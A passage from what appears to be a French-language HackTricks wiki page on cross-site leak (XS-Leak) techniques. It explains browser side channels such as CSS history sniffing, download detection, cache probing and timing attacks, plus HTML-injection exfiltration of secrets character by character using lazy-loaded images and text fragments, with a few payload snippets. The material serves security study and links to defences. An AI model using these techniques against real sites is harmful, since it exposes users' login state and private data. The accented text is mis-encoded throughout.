* **HTMLMediaElement**: Cet √©l√©ment r√©v√®le la `duration` et les temps `buffered` du m√©dia, qui peuvent √™tre accessibles via son API. [En savoir plus sur HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: Il expose `videoHeight` et `videoWidth`. Dans certains navigateurs, des propri√©t√©s suppl√©mentaires comme `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount`, et `webkitDecodedFrameCount` sont disponibles, offrant des informations plus d√©taill√©es sur le contenu multim√©dia. [En savoir plus sur HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Cette fonction fournit des d√©tails sur la qualit√© de lecture vid√©o, y compris `totalVideoFrames`, qui peut indiquer la quantit√© de donn√©es vid√©o trait√©es. [En savoir plus sur getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Cet √©l√©ment divulgue la `height` et la `width` d'une image. Cependant, si une image est invalide, ces propri√©t√©s retourneront 0, et la fonction `image.decode()` sera rejet√©e, indiquant l'√©chec de chargement de l'image correctement. [En savoir plus sur HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Summary:** Identifier les variations dans le style du site web qui correspondent √† l'√©tat ou au statut de l'utilisateur.
* **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Les applications web peuvent changer le **style du site web en fonction du statut de l'utilisateur**. Des fichiers CSS cross-origin peuvent √™tre int√©gr√©s sur la page de l'attaquant avec l'**√©l√©ment HTML link**, et les **r√®gles** seront **appliqu√©es** √† la page de l'attaquant. Si une page change dynamiquement ces r√®gles, un attaquant peut **d√©tecter** ces **diff√©rences** en fonction de l'√©tat de l'utilisateur.\
En tant que technique de fuite, l'attaquant peut utiliser la m√©thode `window.getComputedStyle` pour **lire les propri√©t√©s CSS** d'un √©l√©ment HTML sp√©cifique. En cons√©quence, un attaquant peut lire des propri√©t√©s CSS arbitraires si l'√©l√©ment affect√© et le nom de la propri√©t√© sont connus.

### CSS History

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Summary:** D√©tecter si le style `:visited` est appliqu√© √† une URL indiquant qu'elle a d√©j√† √©t√© visit√©e
* **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Selon [**ceci**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), cela ne fonctionne pas dans Chrome sans t√™te.
{% endhint %}

Le s√©lecteur CSS `:visited` est utilis√© pour styliser les URL diff√©remment si elles ont √©t√© pr√©c√©demment visit√©es par l'utilisateur. Dans le pass√©, la m√©thode `getComputedStyle()` pouvait √™tre utilis√©e pour identifier ces diff√©rences de style. Cependant, les navigateurs modernes ont mis en ≈ìuvre des mesures de s√©curit√© pour emp√™cher cette m√©thode de r√©v√©ler l'√©tat d'un lien. Ces mesures incluent le retour syst√©matique du style calcul√© comme si le lien avait √©t√© visit√© et la restriction des styles pouvant √™tre appliqu√©s avec le s√©lecteur `:visited`.

Malgr√© ces restrictions, il est possible de discerner l'√©tat visit√© d'un lien de mani√®re indirecte. Une technique consiste √† tromper l'utilisateur pour qu'il interagisse avec une zone affect√©e par le CSS, en utilisant sp√©cifiquement la propri√©t√© `mix-blend-mode`. Cette propri√©t√© permet le m√©lange d'√©l√©ments avec leur arri√®re-plan, r√©v√©lant potentiellement l'√©tat visit√© en fonction de l'interaction de l'utilisateur.

De plus, la d√©tection peut √™tre r√©alis√©e sans interaction de l'utilisateur en exploitant les temps de rendu des liens. √âtant donn√© que les navigateurs peuvent rendre les liens visit√©s et non visit√©s diff√©remment, cela peut introduire une diff√©rence de temps mesurable dans le rendu. Un proof of concept (PoC) a √©t√© mentionn√© dans un rapport de bogue Chromium, d√©montrant cette technique en utilisant plusieurs liens pour amplifier la diff√©rence de timing, rendant ainsi l'√©tat visit√© d√©tectable par analyse de timing.

Pour plus de d√©tails sur ces propri√©t√©s et m√©thodes, visitez leurs pages de documentation :

* `:visited`: [Documentation MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [Documentation MDN](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [Documentation MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Headers
* **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Summary:** Dans Google Chrome, une page d'erreur d√©di√©e est affich√©e lorsqu'une page est bloqu√©e d'√™tre int√©gr√©e sur un site cross-origin en raison des restrictions X-Frame-Options.
* **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Dans Chrome, si une page avec l'en-t√™te `X-Frame-Options` d√©fini sur "deny" ou "same-origin" est int√©gr√©e en tant qu'objet, une page d'erreur appara√Æt. Chrome retourne de mani√®re unique un objet document vide (au lieu de `null`) pour la propri√©t√© `contentDocument` de cet objet, contrairement aux iframes ou √† d'autres navigateurs. Les attaquants pourraient exploiter cela en d√©tectant le document vide, r√©v√©lant potentiellement des informations sur l'√©tat de l'utilisateur, surtout si les d√©veloppeurs d√©finissent de mani√®re incoh√©rente l'en-t√™te X-Frame-Options, n√©gligeant souvent les pages d'erreur. La sensibilisation et l'application coh√©rente des en-t√™tes de s√©curit√© sont cruciales pour pr√©venir de telles fuites.

### Download Detection

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Summary:** Un attaquant peut discerner les t√©l√©chargements de fichiers en utilisant des iframes ; l'accessibilit√© continue de l'iframe implique un t√©l√©chargement de fichier r√©ussi.
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

L'en-t√™te `Content-Disposition`, sp√©cifiquement `Content-Disposition: attachment`, indique au navigateur de t√©l√©charger le contenu plut√¥t que de l'afficher en ligne. Ce comportement peut √™tre exploit√© pour d√©tecter si un utilisateur a acc√®s √† une page qui d√©clenche un t√©l√©chargement de fichier. Dans les navigateurs bas√©s sur Chromium, il existe quelques techniques pour d√©tecter ce comportement de t√©l√©chargement :

1. **Surveillance de la barre de t√©l√©chargement** :
* Lorsqu'un fichier est t√©l√©charg√© dans les navigateurs bas√©s sur Chromium, une barre de t√©l√©chargement appara√Æt en bas de la fen√™tre du navigateur.
* En surveillant les changements de la hauteur de la fen√™tre, les attaquants peuvent d√©duire l'apparition de la barre de t√©l√©chargement, sugg√©rant qu'un t√©l√©chargement a √©t√© initi√©.
2. **Navigation de t√©l√©chargement avec des iframes** :
* Lorsqu'une page d√©clenche un t√©l√©chargement de fichier en utilisant l'en-t√™te `Content-Disposition: attachment`, cela ne provoque pas un √©v√©nement de navigation.
* En chargeant le contenu dans une iframe et en surveillant les √©v√©nements de navigation, il est possible de v√©rifier si la disposition du contenu provoque un t√©l√©chargement de fichier (pas de navigation) ou non.
3. **Navigation de t√©l√©chargement sans iframes** :
* Semblable √† la technique iframe, cette m√©thode implique d'utiliser `window.open` au lieu d'une iframe.
* Surveiller les √©v√©nements de navigation dans la nouvelle fen√™tre ouverte peut r√©v√©ler si un t√©l√©chargement de fichier a √©t√© d√©clench√© (pas de navigation) ou si le contenu est affich√© en ligne (la navigation se produit).

Dans les sc√©narios o√π seuls les utilisateurs connect√©s peuvent d√©clencher de tels t√©l√©chargements, ces techniques peuvent √™tre utilis√©es pour d√©duire indirectement l'√©tat d'authentification de l'utilisateur en fonction de la r√©ponse du navigateur √† la demande de t√©l√©chargement.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Summary:** Un attaquant peut discerner les t√©l√©chargements de fichiers en utilisant des iframes ; l'accessibilit√© continue de l'iframe implique un t√©l√©chargement de fichier r√©ussi.
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (de [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
C'est pourquoi cette technique est int√©ressante : Chrome a maintenant **le partitionnement du cache**, et la cl√© de cache de la page nouvellement ouverte est : `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, mais si j'ouvre une page ngrok et que j'utilise fetch dedans, la cl√© de cache sera : `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, la **cl√© de cache est diff√©rente**, donc le cache ne peut pas √™tre partag√©. Vous pouvez trouver plus de d√©tails ici : [Gagner en s√©curit√© et en confidentialit√© en partitionnant le cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Commentaire de [**ici**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Si un site `example.com` inclut une ressource de `*.example.com/resource`, alors cette ressource aura la **m√™me cl√© de cache** que si la ressource √©tait directement **demand√©e par navigation de haut niveau**. Cela est d√ª au fait que la cl√© de cache est constitu√©e de _eTLD+1_ de haut niveau et _eTLD+1_ de frame.

Parce qu'acc√©der au cache est plus rapide que de charger une ressource, il est possible d'essayer de changer l'emplacement d'une page et de l'annuler 20 ms (par exemple) apr√®s. Si l'origine a √©t√© chang√©e apr√®s l'arr√™t, cela signifie que la ressource a √©t√© mise en cache.\
Ou pourrait simplement **envoyer quelques fetch √† la page potentiellement mise en cache et mesurer le temps qu'il faut**.

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirects
* **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Summary:** Il est possible de d√©couvrir si une r√©ponse √† une requ√™te fetch est une redirection
* **Code Example**:

![](<../.gitbook/assets/image (652).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Summary:** Il est possible d'essayer de charger une ressource et d'annuler avant qu'elle ne soit charg√©e. En fonction de si une erreur est d√©clench√©e, la ressource a √©t√© ou n'a pas √©t√© mise en cache.
* **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Utilisez _**fetch**_ et _**setTimeout**_ avec un **AbortController** pour d√©tecter si la **ressource est mise en cache** et pour √©vincer une ressource sp√©cifique du cache du navigateur. De plus, le processus se d√©roule sans mettre en cache de nouveau contenu.

### Script Pollution

* **Inclusion Methods**: HTML Elements (script)
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Summary:** Il est possible de **surcharger des fonctions int√©gr√©es** et de lire leurs arguments m√™me depuis **un script cross-origin** (qui ne peut pas √™tre lu directement), cela pourrait **divulguer des informations pr√©cieuses**.
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Summary:** Mesurer le temps d'ex√©cution d'un web en utilisant des service workers.
* **Code Example**:

Dans le sc√©nario donn√©, l'attaquant prend l'initiative d'enregistrer un **service worker** dans l'un de ses domaines, sp√©cifiquement "attacker.com". Ensuite, l'attaquant ouvre une nouvelle fen√™tre sur le site web cible depuis le document principal et demande au **service worker** de commencer un chronom√®tre. Lorsque la nouvelle fen√™tre commence √† se charger, l'attaquant navigue vers la r√©f√©rence obtenue dans l'√©tape pr√©c√©dente vers une page g√©r√©e par le **service worker**.

√Ä l'arriv√©e de la requ√™te initi√©e dans l'√©tape pr√©c√©dente, le **service worker** r√©pond avec un code d'√©tat **204 (No Content)**, terminant effectivement le processus de navigation. √Ä ce stade, le **service worker** capture une mesure du chronom√®tre initi√© plus t√¥t √† l'√©tape deux. Cette mesure est influenc√©e par la dur√©e du JavaScript causant des retards dans le processus de navigation.

{% hint style="warning" %}
Dans un timing d'ex√©cution, il est possible d'**√©liminer** les **facteurs r√©seau** pour obtenir des **mesures plus pr√©cises**. Par exemple, en chargeant les ressources utilis√©es par la page avant de la charger.
{% endhint %}

### Fetch Timing

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing (g√©n√©ralement d√ª au contenu de la page, code d'√©tat)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Summary:** Utilisez [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) pour mesurer le temps qu'il faut pour effectuer une requ√™te. D'autres horloges pourraient √™tre utilis√©es.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing (g√©n√©ralement d√ª au contenu de la page, code d'√©tat)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Summary:** Utilisez [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) pour mesurer le temps qu'il faut pour effectuer une requ√™te en utilisant `window.open`. D'autres horloges pourraient √™tre utilis√©es.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des workflows** aliment√©s par les outils communautaires **les plus avanc√©s** au monde.\
Obtenez un acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## With HTML or Re Injection

Ici, vous pouvez trouver des techniques pour exfiltrer des informations d'un HTML cross-origin **en injectant du contenu HTML**. Ces techniques sont int√©ressantes dans les cas o√π pour une raison quelconque vous pouvez **injecter du HTML mais vous ne pouvez pas injecter de code JS**.

### Dangling Markup

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Image Lazy Loading

Si vous devez **exfiltrer du contenu** et que vous pouvez **ajouter du HTML avant le secret**, vous devriez v√©rifier les **techniques de balisage pendantes courantes**.\
Cependant, si pour une raison quelconque vous **DEVEZ** le faire **caract√®re par caract√®re** (peut-√™tre que la communication se fait via un hit de cache), vous pouvez utiliser cette astuce.

**Les images** en HTML ont un attribut "**loading**" dont la valeur peut √™tre "**lazy**". Dans ce cas, l'image sera charg√©e lorsqu'elle sera vue et non pendant le chargement de la page :
```html
<img src=/something loading=lazy >
```
Donc, ce que vous pouvez faire est d'**ajouter beaucoup de caract√®res inutiles** (par exemple **des milliers de "W"**) pour **remplir la page web avant le secret ou ajouter quelque chose comme** `<br><canvas height="1850px"></canvas><br>.`\
Ensuite, si par exemple notre **injection appara√Æt avant le drapeau**, l'**image** serait **charg√©e**, mais si elle appara√Æt **apr√®s** le **drapeau**, le drapeau + les caract√®res inutiles **emp√™cheront son chargement** (vous devrez jouer avec la quantit√© de caract√®res inutiles √† placer). C'est ce qui s'est pass√© dans [**ce rapport**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Une autre option serait d'utiliser le **scroll-to-text-fragment** si cela est autoris√© :

#### Scroll-to-text-fragment

Cependant, vous faites en sorte que le **bot acc√®de √† la page** avec quelque chose comme
```
#:~:text=SECR
```
So la page web sera quelque chose comme : **`https://victim.com/post.html#:~:text=SECR`**

O√π post.html contient les caract√®res ind√©sirables de l'attaquant et une image √† chargement paresseux, puis le secret du bot est ajout√©.

Ce texte fera en sorte que le bot acc√®de √† tout texte sur la page contenant le texte `SECR`. Comme ce texte est le secret et qu'il est juste **en dessous de l'image**, l'**image ne se chargera que si le secret devin√© est correct**. Vous avez donc votre oracle pour **exfiltrer le secret caract√®re par caract√®re**.

Un exemple de code pour exploiter cela : [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Chargement d'Image Paresseux Bas√© sur le Temps

S'il est **impossible de charger une image externe** qui pourrait indiquer √† l'attaquant que l'image a √©t√© charg√©e, une autre option serait d'essayer de **deviner le caract√®re plusieurs fois et de mesurer cela**. Si l'image est charg√©e, toutes les requ√™tes prendraient plus de temps que si l'image n'est pas charg√©e. C'est ce qui a √©t√© utilis√© dans la [**solution de ce rapport**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **r√©sum√©e ici :**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Si `jQuery(location.hash)` est utilis√©, il est possible de d√©couvrir via le timing **si un contenu HTML existe**, c'est parce que si le s√©lecteur `main[id='site-main']` ne correspond pas, il n'est pas n√©cessaire de v√©rifier le reste des **s√©lecteurs** :
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Injection CSS

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## D√©fenses

Il existe des att√©nuations recommand√©es dans [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) ainsi que dans chaque section du wiki [https://xsleaks.dev/](https://xsleaks.dev/). Consultez ces ressources pour plus d'informations sur la fa√ßon de se prot√©ger contre ces techniques.

## R√©f√©rences

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour cr√©er facilement et **automatiser des flux de travail** aliment√©s par les **outils communautaires les plus avanc√©s** au monde.\
Obtenez un acc√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
